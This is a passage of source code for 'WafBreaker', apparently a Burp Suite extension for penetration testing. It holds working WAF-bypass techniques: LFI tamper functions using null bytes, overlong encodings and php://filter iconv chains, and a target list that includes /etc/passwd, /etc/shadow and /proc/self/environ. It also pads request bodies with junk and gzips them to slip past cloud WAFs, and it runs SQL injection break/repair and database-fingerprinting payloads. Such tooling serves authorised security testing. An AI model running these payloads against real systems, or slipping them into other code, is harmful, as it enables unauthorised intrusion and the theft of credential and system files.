def lfi_encoded_backslash(path):
    """/->%5c  URL-encoded backslash."""
    return path.replace('/', '%5c')


def lfi_double_encoded_backslash(path):
    """/->%255c  double-encoded backslash."""
    return path.replace('/', '%255c')


def lfi_null_byte(path):
    """Append %00 — PHP include() string terminates at null byte."""
    if not path.endswith('%00'):
        return path + '%00'
    return path


def lfi_null_byte_jpg(path):
    """Append %00.jpg — extension whitelist bypass: .jpg passes, %00 truncates."""
    return path + '%00.jpg'


def lfi_null_byte_php(path):
    """Append %00.php — same trick, php extension variant."""
    return path + '%00.php'


def lfi_uppercase_path(path):
    """Uppercase path tokens — case-insensitive filesystem / WAF regex bypass."""
    out = []
    i = 0
    while i < len(path):
        if path[i] == '%' and i + 2 < len(path):
            out.append(path[i:i+3])   # keep encoded triplets intact
            i += 3
        else:
            out.append(path[i].upper())
            i += 1
    return ''.join(out)


def lfi_php_filter_b64(path):
    """php://filter/convert.base64-encode/resource=  WAF doesn't follow wrapper."""
    return 'php://filter/convert.base64-encode/resource=' + path


def lfi_php_filter_rot13(path):
    """php://filter/string.rot13/resource=  alternate wrapper evasion."""
    return 'php://filter/string.rot13/resource=' + path


def lfi_php_filter_iconv_chain(path):
    """
    Multi-stage iconv chain — generates very long filter string that WAF
    signatures almost never match.  PHP resolves it; output is base64-encoded
    content of the file (confirming LFI without raw path in the response).
    """
    chain = (
        "php://filter/"
        "convert.iconv.UTF-8.CSISO2022KR|"
        "convert.base64-encode|"
        "convert.iconv.UTF-8.UTF7|"
        "convert.iconv.UTF-8.UTF16LE|"
        "convert.iconv.UTF-8.CSISO2022KR|"
        "convert.base64-encode|"
        "convert.iconv.UTF-8.UTF7"
        "/resource="
    )
    return chain + path


def lfi_compress_zlib(path):
    """compress.zlib://  stream wrapper — less-audited code path in some WAFs."""
    return 'compress.zlib://' + path


# ── Master LFI tamper registry ────────────────────────────────────────────────
# (name, function, description)

LFI_TAMPERS = [
    # ── Double / overlong encoding ────────────────────────────────────────────
    ("double-urlencode",          lfi_double_urlencode,           ".->%252E /->%252F"),
    ("double-urlencode-slash",    lfi_double_urlencode_slash_only,"/->%252F (slash only)"),
    ("overlong-utf8-c0af",        lfi_overlong_c0af,              "/->%c0%af"),
    ("overlong-utf8-e080af",      lfi_overlong_e080af,            "/->%e0%80%af"),
    # ── Unicode slash variants ────────────────────────────────────────────────
    ("unicode-u002f",             lfi_unicode_u002f,              "/->%u002f"),
    ("unicode-u2215",             lfi_unicode_u2215,              "/->%u2215 division slash"),
    ("unicode-uff0f",             lfi_unicode_uff0f,              "/->%uff0f fullwidth"),
    # ── Dot / slash encoding ──────────────────────────────────────────────────
    ("encoded-dotslash-full",     lfi_encoded_dotslash_full,      "../->%2e%2e%2f"),
    ("encoded-dotslash-dotonly",  lfi_encoded_dotslash_dotonly,   "../->%2e%2e/"),
    ("dot-slash-mixed-enc",       lfi_dot_slash_mixed_enc,        "../->%2e./"),
    ("mixed-slash-enc",           lfi_mixed_slash_enc,            "../->.%2F./"),
    # ── Path confusion ────────────────────────────────────────────────────────
    ("dotdot-double-slash",       lfi_dotdot_double_slash,        "../->....//"),
    ("dotdot-triple-slash",       lfi_dotdot_triple_slash,        "../->.....///"),
    ("semicolon-sep",             lfi_semicolon_sep,              "../->..;/ (Java)"),
    ("path-params",               lfi_path_params,                "../->..;x=y/"),
    ("valid-prefix",              lfi_valid_prefix,               "prefix images/"),
    ("extra-slash",               lfi_extra_slash,                "/->// normalises"),
    # ── Null byte ─────────────────────────────────────────────────────────────
    ("null-byte",                 lfi_null_byte,                  "append %00"),
    ("null-byte-jpg",             lfi_null_byte_jpg,              "append %00.jpg"),
    ("null-byte-php",             lfi_null_byte_php,              "append %00.php"),
    # ── Backslash ─────────────────────────────────────────────────────────────
    ("backslash",                 lfi_backslash,                  "/->\\"),
    ("encoded-backslash",         lfi_encoded_backslash,          "/->%5c"),
    ("double-encoded-backslash",  lfi_double_encoded_backslash,   "/->%255c"),
    # ── Case ──────────────────────────────────────────────────────────────────
    ("uppercase",                 lfi_uppercase_path,             "PATH->UPPERCASE"),
    # ── PHP wrappers ──────────────────────────────────────────────────────────
    ("php-filter-b64",            lfi_php_filter_b64,             "php://filter/b64"),
    ("php-filter-rot13",          lfi_php_filter_rot13,           "php://filter/rot13"),
    ("php-filter-iconv-chain",    lfi_php_filter_iconv_chain,     "multi-stage iconv chain"),
    ("compress-zlib",             lfi_compress_zlib,              "compress.zlib://"),
]

# ── LFI targeted confirmation file list ───────────────────────────────────────
# Used by _phase_confirm_lfi() to verify actual file content is returned.
# Ordered highest-value first.  PHP wrapper entries skip bypass transforms.
LFI_TARGET_FILES = [
    # Linux — multiple traversal depths
    ("../../../etc/passwd",         "/etc/passwd (3-level)",      False),
    ("../../../../etc/passwd",      "/etc/passwd (4-level)",      False),
    ("../../etc/passwd",            "/etc/passwd (2-level)",      False),
    ("../../../../../etc/passwd",   "/etc/passwd (5-level)",      False),
    ("/etc/passwd",                 "/etc/passwd (absolute)",     False),
    ("../../../etc/shadow",         "/etc/shadow (hashes)",       False),
    ("../../../etc/hosts",          "/etc/hosts",                 False),
    ("../../../proc/self/environ",  "/proc/self/environ",         False),
    ("../../../proc/version",       "/proc/version",              False),
    ("/etc/issue",                  "/etc/issue (OS banner)",     False),
    # Windows
    ("../../windows/win.ini",       "windows/win.ini",            False),
    ("..\\..\\windows\\win.ini",    "windows\\win.ini (BS)",      False),
    ("C:\\windows\\win.ini",        "win.ini (absolute)",         False),
    ("C:\\boot.ini",                "boot.ini",                   False),
    # Web server logs
    ("../../../var/log/apache2/access.log", "Apache access.log", False),
    ("../../../var/log/nginx/access.log",   "Nginx access.log",  False),
    # PHP wrappers — skip bypass transform (wrapper syntax is self-contained)
    ("php://filter/convert.base64-encode/resource=/etc/passwd",
     "PHP wrapper → /etc/passwd",          True),
    ("php://filter/convert.base64-encode/resource=../../../etc/passwd",
     "PHP wrapper → traversal /etc/passwd", True),
]

# Extended LFI success patterns (beyond SUCCESS_PATTERNS["LFI"])
LFI_CONFIRM_PATTERNS = [
    (r"root:x:0:0",               "/etc/passwd root entry"),
    (r"daemon:x:\d+:\d+",         "/etc/passwd daemon entry"),
    (r"nobody:x:",                 "/etc/passwd nobody entry"),
    (r"/bin/bash",                 "/etc/passwd bash shell"),
    (r"/bin/sh",                   "/etc/passwd sh shell"),
    (r"nologin",                   "/etc/passwd nologin entry"),
    (r"\[extensions\]",            "win.ini extensions section"),
    (r"for 16-bit app",            "win.ini 16-bit note"),
    (r"\[boot loader\]",           "boot.ini boot loader section"),
    (r"PROCESSOR_IDENTIFIER",      "Windows environment variable"),
    (r"HTTP_USER_AGENT",           "/proc/self/environ exposure"),
    (r"DOCUMENT_ROOT",             "/proc/self/environ web root"),
    (r"Linux version \d+\.\d+",    "kernel version string"),
    (r"[A-Za-z0-9+/]{80,}={0,2}", "base64 blob (PHP wrapper success)"),
]


# ═══════════════════════════════════════════════════════════════════════════════
#   BURP SCAN ISSUE  — wraps findings so they appear in Target > Issues
# ═══════════════════════════════════════════════════════════════════════════════

class WafBreakerIssue(IScanIssue):
    """
    Minimal IScanIssue implementation.
    Burp calls addScanIssue(instance) to surface findings in the Issues panel.

    Severity   : "High" | "Medium" | "Low" | "Information"
    Confidence : "Certain" | "Firm" | "Tentative"
    """

    # Custom issue type ID — Burp will group / deduplicate by (url, type, name).
    # 0x08000000 is the conventional base for extension-defined issues.
    ISSUE_TYPE = 0x08000000

    def __init__(self, http_service, url, http_messages,
                 name, detail, severity, confidence):
        self._svc    = http_service
        self._url    = url
        self._msgs   = http_messages   # list of IHttpRequestResponse
        self._name   = name
        self._detail = detail
        self._sev    = severity
        self._conf   = confidence

    def getUrl(self):                   return self._url
    def getIssueName(self):             return self._name
    def getIssueType(self):             return self.ISSUE_TYPE
    def getSeverity(self):              return self._sev
    def getConfidence(self):            return self._conf
    def getIssueBackground(self):       return (
        "WafBreaker is a Burp Suite extension that probes for WAF bypass "
        "techniques before launching a targeted vulnerability scan. "
        "Findings reported here survived or circumvented the WAF."
    )
    def getRemediationBackground(self): return (
        "Ensure WAF rules are kept up-to-date, test against encoded and "
        "obfuscated payload variants, and treat WAF bypass findings as "
        "critical gaps in your perimeter defence."
    )
    def getIssueDetail(self):           return self._detail
    def getRemediationDetail(self):     return None
    def getHttpMessages(self):          return self._msgs
    def getHttpService(self):           return self._svc


# ═══════════════════════════════════════════════════════════════════════════════
#   MAIN EXTENDER
# ═══════════════════════════════════════════════════════════════════════════════

class BurpExtender(IBurpExtender, IContextMenuFactory):

    # How long to pause between HTTP requests (seconds).
    # 0.6 s ≈ ~1.6 req/s — gentle enough for most apps.
    REQUEST_DELAY = 0.6

    def registerExtenderCallbacks(self, callbacks):
        self._cb      = callbacks
        self._h       = callbacks.getHelpers()
        callbacks.setExtensionName(EXT_NAME)
        callbacks.registerContextMenuFactory(self)

        # ── Burp Collaborator client (Blind XSS / OOB) ───────────────────────
        # Available in Burp Suite Professional only.
        self._collab_client = None
        self._collab_host   = None
        try:
            self._collab_client = callbacks.createBurpCollaboratorClientContext()
            self._collab_host   = self._collab_client.generatePayload(True)
            self._p("[*] Burp Collaborator active — host: %s" % self._collab_host)
        except Exception:
            self._p("[!] Burp Collaborator not available (Burp Pro required) — "
                    "Blind XSS / OOB payloads will use placeholder domain.")

        self._p("[*] WafBreaker v%s ready." % VERSION)
        self._p("[*] Results appear in: Extensions > WafBreaker > Output")
        self._p("[*] Payloads — XSS:%d | SQLi:%d | CMDi:%d | LFI:%d | SSRF:%d" % (
            len(PAYLOADS["XSS"]), len(PAYLOADS["SQL Injection"]),
            len(PAYLOADS["Command Injection"]), len(PAYLOADS["LFI"]),
            len(PAYLOADS["SSRF"])))
        self._p("[*] LFI tamper transforms: %d  |  SQLi tamper scripts: %d" % (
            len(LFI_TAMPERS), len(SQLI_TAMPERS)))

        # ── SQLi tamper seed summary ──────────────────────────────────────────
        total_seeds = sum(len(s) for _, s in SQLI_PAYLOAD_SEEDS)
        ext_cats    = [(lbl, len(s)) for lbl, s in SQLI_PAYLOAD_SEEDS
                       if lbl.startswith("ext-")]
        self._p("[*] SQLi tamper seeds — %d categories, %d total payloads" % (
            len(SQLI_PAYLOAD_SEEDS), total_seeds))
        if ext_cats:
            for lbl, cnt in ext_cats:
                self._p("    %-22s  %d seeds loaded from file" % (lbl, cnt))
        else:
            self._p("    [!] No sqli/ files loaded — check path next to waf.py")

    def _p(self, msg):
        self._cb.printOutput(msg)

    # ── IContextMenuFactory ───────────────────────────────────────────────────
    def createMenuItems(self, invocation):
        self._invocation = invocation
        items = ArrayList()
        main = JMenu(u"⚡ " + EXT_NAME)

        for vtype in PAYLOADS.keys():
            item = JMenuItem(vtype)
            # Capture loop var
            item.addActionListener(lambda e, v=vtype: self._dispatch(v))
            main.add(item)

        items.add(main)
        return items

    def _dispatch(self, vuln_type):
        msgs = self._invocation.getSelectedMessages()
        if not msgs:
            self._p("[!] No request selected.")
            return

        bounds = None
        try:
            b = self._invocation.getSelectionBounds()
            if b and len(b) == 2 and b[0] != b[1]:
                bounds = (b[0], b[1])
        except Exception:
            pass

        class _Worker(Runnable):
            def __init__(self, ext, msg, vtype, bnd):
                self.ext   = ext
                self.msg   = msg
                self.vtype = vtype
                self.bnd   = bnd
            def run(self):
                try:
                    ScanEngine(
                        self.ext._cb,
                        self.ext._h,
                        self.ext.REQUEST_DELAY,
                        self.msg,
                        self.vtype,
                        self.bnd
                    ).run()
                except Exception as exc:
                    self.ext._cb.printOutput("[ERROR] " + str(exc))

        JThread(_Worker(self, msgs[0], vuln_type, bounds)).start()


# ═══════════════════════════════════════════════════════════════════════════════
#   SCAN ENGINE
# ═══════════════════════════════════════════════════════════════════════════════

class ScanEngine(object):

    JUNK_SIZE_BYTES = 135000   # ~132 KB  — exceeds Cloudflare/AWS/Azure WAF limits

    def __init__(self, callbacks, helpers, req_delay, message, vuln_type, bounds):
        self._cb        = callbacks
        self._h         = helpers
        self._delay     = req_delay     # seconds between requests (rate-limiting)
        self._msg       = message
        self._vtype     = vuln_type
        self._bounds    = bounds
        self._svc       = message.getHttpService()
        self._base_req  = message.getRequest()
        self._waf_found = False
        self._bypass    = None           # dict describing working bypass
        self._req_count = 0              # total requests sent this scan
        self._last_http_msg = None       # IHttpRequestResponse from most recent _send
        self._reported_issues = set()    # deduplicate issues by (name, payload[:60])
        self._waf_vendor       = None    # identified WAF vendor string (e.g. "cloudflare")
        self._blocked_baseline = None    # fingerprint of a known-blocked response
        self._clean_baseline   = None    # fingerprint of a clean (uninjected) response
        self._issued_high      = set()   # vtypes that already have a filed High finding
        self._vuln_extra_payloads = {}   # vtype → list of extra payloads after first confirm

        # Resolve the base URL once — reused for all addScanIssue() calls
        try:
            self._base_url = self._h.analyzeRequest(
                self._svc, bytes(self._base_req)).getUrl()
        except Exception:
            self._base_url = None

    def _log(self, msg):
        self._cb.printOutput("[WafBreaker][%s] %s" % (self._vtype, msg))

    def _report(self, technique, payload, status, body, outcome):
        """Emit one result line to Burp's extension Output tab."""
        snippet = (body[:100].replace('\n', ' ').replace('\r', '')) if body else ""
        line = "[%s] %-40s HTTP %-3d | %s | %s" % (
            outcome.ljust(7), technique[:40], status,
            payload[:70].replace('\n', ' '), snippet[:60])
        self._cb.printOutput(line)

    # ── HTTP transport ────────────────────────────────────────────────────────
    def _send(self, req_bytes):
        """
        Returns (status_code, body_str).  On error returns (0, '').
        Enforces per-request sleep to avoid flooding the target application.
        """
        # Rate-limit: sleep before every request except the very first
        if self._req_count > 0:
            time.sleep(self._delay)
        self._req_count += 1
        try:
            resp_obj  = self._cb.makeHttpRequest(self._svc, req_bytes)
            self._last_http_msg = resp_obj   # keep for issue reporting
            resp_raw  = resp_obj.getResponse()
            if not resp_raw:
                return 0, ""
            analyzed  = self._h.analyzeResponse(resp_raw)
            status    = analyzed.getStatusCode()
            offset    = analyzed.getBodyOffset()
            body      = self._h.bytesToString(resp_raw[offset:])
            return status, body
        except Exception as ex:
            self._log("Transport error: " + str(ex))
            return 0, ""

    # ── Request builder ───────────────────────────────────────────────────────
    def _build_request(self, payload,
                       extra_headers=None,
                       override_method=None,
                       charset=None,
                       add_junk=False,
                       compress_body=False,
                       json_body=False,
                       json_escape=False):
        """
        Inject payload at the selection (or last body param),
        then apply bypass modifiers and return a byte array.
        compress_body: gzip the request body + add Content-Encoding: gzip
        json_body:     replace body with JSON {"param": payload}, set Content-Type: application/json
        json_escape:   unicode-escape every char of payload before embedding in JSON
        """
        base = bytearray(self._base_req)

        # Convert payload to bytes (Jython 2.7 compatible)
        try:
            if isinstance(payload, unicode):
                pay_bytes = bytearray(payload.encode('utf-8'))
            else:
                # str in Python 2.7 — encode first to get bytes safely
                pay_bytes = bytearray(payload.encode('utf-8') if hasattr(payload, 'encode') else payload)
        except (TypeError, UnicodeDecodeError):
            pay_bytes = bytearray([ord(c) & 0xFF for c in str(payload)])

        # ── Injection point ───────────────────────────────────────────────────
        if self._bounds:
            start, end = self._bounds
            modified = base[:start] + pay_bytes + base[end:]
        else:
            # Fallback: replace last parameter's value
            analyzed = self._h.analyzeRequest(self._svc, bytes(base))
            params   = analyzed.getParameters()
            injected = False
            if params:
                for i in range(len(params) - 1, -1, -1):
                    p = params[i]
                    # PARAM_BODY = 1, PARAM_URL = 0
                    if p.getType() in (0, 1):
                        ps = p.getValueStart()
                        pe = p.getValueEnd()
                        modified = base[:ps] + pay_bytes + base[pe:]
                        injected = True
                        break
            if not injected:
                modified = base

        # ── Junk padding (body-size bypass) ───────────────────────────────────
        if add_junk:
            junk_str = "&wafbypass=" + "W" * self.JUNK_SIZE_BYTES
            junk = bytearray([ord(c) for c in junk_str])
            modified = bytearray(modified) + junk

        # ── Decompose into headers + body ─────────────────────────────────────
        analyzed2 = self._h.analyzeRequest(bytes(modified))
        headers   = list(analyzed2.getHeaders())
        body_off  = analyzed2.getBodyOffset()
        body      = bytearray(modified[body_off:])

        # ── Override HTTP verb ────────────────────────────────────────────────
        if override_method:
            first = headers[0]
            sp    = first.find(' ')
            if sp != -1:
                headers[0] = override_method + first[sp:]

        # ── Extra headers ─────────────────────────────────────────────────────
        if extra_headers:
            # Remove existing headers with same name to avoid duplication
            names = [h.split(':')[0].lower() for h in extra_headers]
            headers = [h for h in headers
                       if h.split(':')[0].lower() not in names
                       or h == headers[0]]  # keep request line
            for eh in extra_headers:
                headers.append(eh)

        # ── Charset manipulation ──────────────────────────────────────────────
        if charset:
            for i, h in enumerate(headers):
                if h.lower().startswith("content-type:"):
                    h = re.sub(r';\s*charset=[^\s;]*', '', h,
                                flags=re.IGNORECASE).rstrip()
                    headers[i] = h + '; charset=' + charset
                    break

        # ── JSON body injection ───────────────────────────────────────────────
        # Completely replaces the body with a JSON object containing the payload
        # as a string value.  Many WAFs apply weaker rules to application/json.
        if json_body:
            try:
                import json as _json
                analyzed_jb = self._h.analyzeRequest(self._svc, bytes(self._base_req))
                params_jb   = analyzed_jb.getParameters()
                pname = "q"
                if params_jb:
                    for _pjb in params_jb:
                        if _pjb.getType() in (0, 1):
                            pname = _pjb.getName()
                            break
                # Optionally unicode-escape every char so WAF regex sees \uXXXX
                jval = (_json_unicode_escape(payload) if json_escape else payload)
                try:
                    json_str = _json.dumps({pname: jval})
                except Exception:
                    json_str = ('{"' + pname + '": "'
                                + jval.replace('\\', '\\\\').replace('"', '\\"') + '"}')
                body = bytearray(json_str.encode('utf-8'))
                headers = [h for h in headers
                           if not h.lower().startswith("content-type:")]
                headers.append("Content-Type: application/json")
            except Exception:
                pass   # fall through with original body if JSON encoding fails

        # ── Gzip body compression ─────────────────────────────────────────────
        # Some WAFs skip decompression and inspect raw bytes; backends decompress
        # transparently.  WAF sees \x1f\x8b… and misses the payload entirely.
        if compress_body:
            try:
                body = _gzip_compress(bytes(body))
                headers = [h for h in headers
                           if not h.lower().startswith("content-encoding:")]
                headers.append("Content-Encoding: gzip")
            except Exception:
                pass   # fall through with uncompressed body if gzip fails

        # ── Build final request & fix Content-Length ──────────────────────────
        final = self._h.buildHttpMessage(headers, bytes(body))
        return self._fix_cl(final)

    def _fix_cl(self, req_bytes):
        """Update Content-Length to match actual body length."""
        analyzed = self._h.analyzeRequest(req_bytes)
        headers  = list(analyzed.getHeaders())
        off      = analyzed.getBodyOffset()
        body     = req_bytes[off:]
        blen     = len(body)
        updated  = []
        has_cl   = False
        for h in headers:
            if h.lower().startswith("content-length:"):
                updated.append("Content-Length: " + str(blen))
                has_cl = True
            else:
                updated.append(h)
        if not has_cl and blen > 0:
            updated.append("Content-Length: " + str(blen))
        return self._h.buildHttpMessage(updated, body)

    # ── Issue reporter ────────────────────────────────────────────────────────
    def _add_issue(self, name, detail, severity="Medium", confidence="Firm"):
        """
        Surface a finding in Burp's Target > Issues panel.
        Deduplicates by (name, detail[:60]) so multiple identical hits
        from the tamper sweep don't flood the panel.
        """
        if self._base_url is None:
            return
        dedup_key = (name, detail[:120])
        if dedup_key in self._reported_issues:
            return
        self._reported_issues.add(dedup_key)
        try:
            msgs = [self._last_http_msg] if self._last_http_msg else []
            issue = WafBreakerIssue(
                self._svc,
                self._base_url,
                msgs,
                "[WafBreaker] " + name,
                detail,
                severity,
                confidence,
            )
            self._cb.addScanIssue(issue)
            self._log("[ISSUE ADDED] %s  [%s / %s]" % (name, severity, confidence))
        except Exception as ex:
            self._log("[ISSUE ERROR] " + str(ex))

    # ── WAF / success detection ───────────────────────────────────────────────
    def _is_blocked(self, status, body):
        # Hard signal: known WAF status codes
        if status in WAF_STATUS_CODES:
            return True
        bl = body.lower()
        for pat in WAF_BODY_PATTERNS:
            if re.search(pat, bl):
                return True
        # Soft signal: if response closely matches the captured blocked baseline,
        # it's the same block page even if status/patterns differ (e.g. 200 + challenge page).
        if self._blocked_baseline:
            bl_len  = self._blocked_baseline["len"]
            cur_len = len(body)
            if (bl_len > 50                                     # ignore empty/trivial bodies
                    and self._blocked_baseline["status"] == status
                    and bl_len > 0
                    and abs(cur_len - bl_len) / float(bl_len) < 0.05):
                if body[:120].lower() == self._blocked_baseline["snippet"][:120]:
                    return True
        return False

    def _bypass_confidence(self, status, body):
        """
        Return IScanIssue confidence string based on how different the bypass
        response is from the known-blocked baseline.
        "Certain"  — large structural deviation from block page
        "Firm"     — different status or clear content change
        "Tentative"— slight deviation, no strong signal either way
        """
        if self._blocked_baseline is None:
            return "Firm"
        bl_len  = self._blocked_baseline["len"]
        cur_len = len(body)
        if status != self._blocked_baseline["status"]:
            return "Certain"
        if bl_len > 0:
            delta = abs(cur_len - bl_len) / float(bl_len)
            if delta > 0.30:
                return "Certain"
            if delta > 0.08:
                return "Firm"
        return "Tentative"

    def _is_vuln(self, status, body):
        if status not in (200, 201, 302, 301):
            return False
        for pat in SUCCESS_PATTERNS.get(self._vtype, []):
            if re.search(pat, body, re.IGNORECASE):
                return True
        return False

    # ── Outcome label ─────────────────────────────────────────────────────────
    def _outcome(self, status, body):
        if self._is_vuln(status, body):
            return "VULN!"
        if self._is_blocked(status, body):
            return "BLOCKED"
        if status == 0:
            return "ERROR"
        return "PASSED"

    def _fingerprint_waf(self, resp_headers_str, body):
        """
        Identify which WAF vendor blocked the request.
        resp_headers_str: all response headers joined as a single lowercased string.
        Returns a vendor key from WAF_VENDOR_SIGNATURES or None.
        """
        low_hdrs = resp_headers_str.lower()
        low_body = body.lower()
        for vendor, sigs in WAF_VENDOR_SIGNATURES.items():
            for pat in sigs.get("headers", []):
                if re.search(pat, low_hdrs):
                    return vendor
            for pat in sigs.get("body", []):
                if re.search(pat, low_body):
                    return vendor
        return None

    # ── Response comparison helpers ───────────────────────────────────────────
    def _response_differs(self, status, body):
        """
        True if this response is meaningfully different from the clean baseline.
        Used to detect that a break payload changed application behaviour.
        """
        if self._clean_baseline is None:
            return False
        cl = self._clean_baseline
        if status != cl["status"]:
            return True
        blen = cl["len"]
        if blen > 0 and abs(len(body) - blen) / float(blen) > 0.07:
            return True
        return False

    def _response_matches_baseline(self, status, body):
        """
        True if this response is close enough to the clean baseline to count as
        a 'repaired' state — same status, similar body length, no SQL errors.
        """
        if self._clean_baseline is None:
            return False
        cl = self._clean_baseline
        if status != cl["status"]:
            return False
        blen = cl["len"]
        if blen > 0 and abs(len(body) - blen) / float(blen) > 0.12:
            return False
        if self._is_vuln(status, body):   # SQL error = not repaired
            return False
        return True

    # ═════════════════════════════════════════════════════════════════════════
    #   PHASE 1.5 — BREAK & REPAIR  (SQL Injection only)
    #   Confirms injection by breaking the SQL statement with quote variants
    #   (including URL-encoded forms like %27) and verifying that a repair
    #   payload removes the error / restores the valid response.
    #   Also fingerprints the database variant using Tib3rius' identification
    #   payloads (MySQL → MSSQL → PostgreSQL → Oracle → SQLite).
    # ═════════════════════════════════════════════════════════════════════════
    def _phase_break_repair(self):
        if self._vtype != "SQL Injection":
            return
        self._log("[Phase 1.5] Break & Repair — SQLi confirmation + DB fingerprinting...")

        # ── Step 0: Clean baseline ────────────────────────────────────────────
        # Send the unmodified original request to establish the valid-response baseline.
        c_status, c_body = self._send(bytes(self._base_req))
        if c_status == 0:
            self._log("[1.5] Cannot reach endpoint — skipping.")
            return
        self._clean_baseline = {
            "status":  c_status,
            "len":     len(c_body),
            "snippet": c_body[:300].lower(),
        }
        self._log("[1.5] Baseline: HTTP %d, %d bytes" % (c_status, len(c_body)))
        if self._is_blocked(c_status, c_body):
            self._log("[1.5] Baseline itself is blocked — can't do response-diff; will rely on error patterns only.")

        # ── Step 1: Break ─────────────────────────────────────────────────────
        # Try single-quote then its URL-encoded form %27.
        # Many WAFs block raw ' but pass %27 — the server decodes it to ' and SQL chokes.
        break_probes = [
            ("'",    "raw single-quote"),
            ("%27",  "URL-encoded %27"),
            ('"',    "raw double-quote"),
            ("%22",  "URL-encoded %22"),
        ]
        broke_with_error  = False
        broke_with_change = False
        break_payload     = None
        break_label       = None

        for bp, blabel in break_probes:
            kwargs = {}
            bp2, bkw = self._apply_bypass(bp, kwargs)
            breq = self._build_request(bp2, **bkw)
            bs, bb = self._send(breq)
            oc = self._outcome(bs, bb)
            self._report("[B&R] Break: " + blabel, bp, bs, bb, oc)
            if self._is_vuln(bs, bb):
                self._log("[1.5] Break got SQL error: %s" % blabel)
                broke_with_error  = True
                break_payload = bp
                break_label   = blabel
                break
            if self._response_differs(bs, bb) and not self._is_blocked(bs, bb):
                self._log("[1.5] Break changed response: %s" % blabel)
                broke_with_change = True
                break_payload = bp
                break_label   = blabel
                break

        # Fallback: integer-context breaks (no quotes)
        if not broke_with_error and not broke_with_change:
            self._log("[1.5] Quote break had no effect — trying integer-context breaks...")
            for ibp in [" AND 1=2 -- -", " AND 0 -- -", "%20AND%201%3D2%20--%20-"]:
                kwargs2 = {}
                ibp2, ibkw = self._apply_bypass(ibp, kwargs2)
                ireq = self._build_request(ibp2, **ibkw)
                is_, ib = self._send(ireq)
                oc_i = self._outcome(is_, ib)
                self._report("[B&R] Int-break", ibp, is_, ib, oc_i)
                if (self._response_differs(is_, ib) and not self._is_blocked(is_, ib)):
                    self._log("[1.5] Integer break changed response: %s" % ibp)
                    broke_with_change = True
                    break_payload = ibp
                    break_label   = "integer: " + ibp
                    break

        if not broke_with_error and not broke_with_change:
            self._log("[1.5] No break detected — injection not confirmed via Break&Repair.")
            return

        # ── Step 2: Repairs ───────────────────────────────────────────────────
        # Test repairs for BOTH raw and URL-encoded forms.
        # %27%27 is the URL-encoded repair for '' — closes and reopens string context.
        repairs = [
            # (payload,                    label,            force_no_bypass_transform)
            ("%27%27",                      "%27%27 (URL '')",       False),
            ("''",                          "'' (double quote)",     False),
            ("' -- -",                      "' -- -",                False),
            ("%27 -- -",                    "%27 -- - (URL)",        False),
            ("%27%20--%20-",                "%27%20--%20- (URL)",    False),
            ("' AND '1'='1",               "' AND '1'='1",          False),
            ("%27 AND %271%27=%271",        "%27 AND... (URL)",      False),
            ("'||'",                        "'||' (pipe concat)",    False),
            ("%27||%27",                    "%27||%27 (URL)",        False),
            ("' '",                         "' ' (space concat)",   False),
            (" AND 1=1 -- -",               "AND 1=1 -- - (int)",   False),
            (" -- -",                       " -- - (int comment)",  False),
        ]

        confirmed        = False
        confirmed_repair = None
        confirmed_label  = None

        for (rep_pay, rep_label, skip_bypass) in repairs:
            kwargs3 = {}
            if skip_bypass:
                rp = rep_pay
                rkw = {}
            else:
                rp, rkw = self._apply_bypass(rep_pay, kwargs3)
            rreq = self._build_request(rp, **rkw)
            rs, rb = self._send(rreq)
            oc_r = self._outcome(rs, rb)
            self._report("[B&R] Repair: " + rep_label, rep_pay, rs, rb, oc_r)

            if broke_with_error:
                # If break gave a SQL error, any repair that removes it = confirmed
                if not self._is_vuln(rs, rb) and not self._is_blocked(rs, rb):
                    self._log("[+] Repair removed SQL error: %s" % rep_label)
                    confirmed = True
                    confirmed_repair = rep_pay
                    confirmed_label  = rep_label
                    break
            else:
                # Break only changed response (no explicit error).
                # Repair is confirmed if it restores something closer to baseline
                # OR if the response is different from the break response.
                if self._response_matches_baseline(rs, rb) or (
                        not self._is_blocked(rs, rb) and not self._response_differs(rs, rb)):
                    self._log("[+] Repair restored response: %s" % rep_label)
                    confirmed = True
                    confirmed_repair = rep_pay
                    confirmed_label  = rep_label
                    break

        if not confirmed:
            self._log("[1.5] No repair worked — injection not confirmed via Break&Repair.")
            # Still: if break gave an error, that alone is suggestive
            if broke_with_error:
                self._add_issue(
                    "Possible SQL Injection — Error on Break (unconfirmed)",
                    "The payload <code>%s</code> caused a SQL error response, but no repair "
                    "payload successfully restored the original state.<br>"
                    "This may indicate SQL injection — manual verification recommended."
                    % (break_payload or "?"),
                    severity="Medium",
                    confidence="Tentative",
                )
            return

        # ── Step 3: Boolean differential ──────────────────────────────────────
        self._log("[1.5] Boolean differential verification...")
        kwargs4, kwargs5 = {}, {}
        bt_p, bt_kw = self._apply_bypass("' AND '1'='1", kwargs4)
        bf_p, bf_kw = self._apply_bypass("' AND '1'='0", kwargs5)
        bt_req = self._build_request(bt_p, **bt_kw)
        bf_req = self._build_request(bf_p, **bf_kw)
        bt_s, bt_b = self._send(bt_req)
        bf_s, bf_b = self._send(bf_req)
        self._report("[B&R] Bool TRUE",  "' AND '1'='1", bt_s, bt_b, self._outcome(bt_s, bt_b))
        self._report("[B&R] Bool FALSE", "' AND '1'='0", bf_s, bf_b, self._outcome(bf_s, bf_b))

        bool_confirmed = (
            not self._is_vuln(bt_s, bt_b)
            and not self._is_blocked(bt_s, bt_b)
            and not self._is_vuln(bf_s, bf_b)
            and not self._is_blocked(bf_s, bf_b)
            and self._response_differs(bf_s, bf_b)   # false condition changed response
        )

        # ── Step 4: DB variant fingerprinting ─────────────────────────────────
        # Tib3rius cheatsheet order: MySQL → MSSQL → PostgreSQL → Oracle → SQLite
        db_fp = [
            ("AND 'foo' 'bar' = 'foobar'",    "MySQL / MariaDB"),
            ("AND DATALENGTH('foo') = 3",      "MSSQL / SQL Server"),
            ("AND TO_HEX(1) = '1'",            "PostgreSQL"),
            ("AND LENGTHB('foo') = '3'",       "Oracle"),
            ("AND GLOB('foo*', 'foobar') = 1", "SQLite"),
        ]
        db_variant = None
        self._log("[1.5] Fingerprinting DB variant (%d probes)..." % len(db_fp))
        for fp_pay, fp_db in db_fp:
            kwargs6 = {}
            fp_t, fp_kw = self._apply_bypass(fp_pay, kwargs6)
            fp_req = self._build_request(fp_t, **fp_kw)
            fp_s, fp_b = self._send(fp_req)
            oc_fp = self._outcome(fp_s, fp_b)
            self._report("[DB FP] " + fp_db, fp_pay, fp_s, fp_b, oc_fp)
            # A fingerprint matches if the payload doesn't produce an error
            # AND the response is close to baseline (condition evaluated as TRUE)
            if not self._is_vuln(fp_s, fp_b) and not self._is_blocked(fp_s, fp_b):
